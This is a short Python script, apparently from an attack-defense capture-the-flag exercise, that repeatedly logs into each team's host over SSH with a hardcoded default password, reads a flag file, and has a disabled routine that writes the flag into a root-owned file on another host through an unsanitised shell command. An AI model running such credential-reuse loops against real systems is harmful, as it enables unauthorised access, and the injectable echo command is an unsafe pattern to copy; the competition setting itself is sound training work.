import paramiko

def connect_ssh(ip, port):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(ip, port=port, username='dev1', password='w3ar3h4ck3r2')
        stdin, stdout, stderr = client.exec_command('cat /tmp/flag.txt')
        content = stdout.read().decode().strip()
        client.close()
        return content
    except (paramiko.AuthenticationException, paramiko.SSHException):
        print ("Error in connection")
        return None
    
def connect_ssh_submission(ip, username, content):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    rsa_key = paramiko.RSAKey.from_private_key_file(f'/home/xza/Documents/repoak/ctf-gameserver-terraform/proxmox/output/team2/team2-sshkey')
    try:
        client.connect(ip, username = username, pkey=rsa_key)
        stdin, stdout, stderr = client.exec_command('mkdir -p /root && echo "{}" > /root/xxx.flag'.format(content))
        # SSH connection cleanup
        client.close()
    except (paramiko.AuthenticationException, paramiko.SSHException) as e:
        print("Error: ", e)
# Example usage:
port = 8822
team_count = 2
ip_mask = '10.0.%d.101'
while True:
    for team_number in range(1, team_count+1):
        ip = ip_mask % team_number
        content = connect_ssh(ip, port)
        if content is None:
            print("Team", team_number, " NOT successfully connected and authenticated.")
        else:
            print("Team: ", team_number, "\nContent: ", content,)
            # connect_ssh_submission ('10.0.5.1','root',content)
    

        

        

    
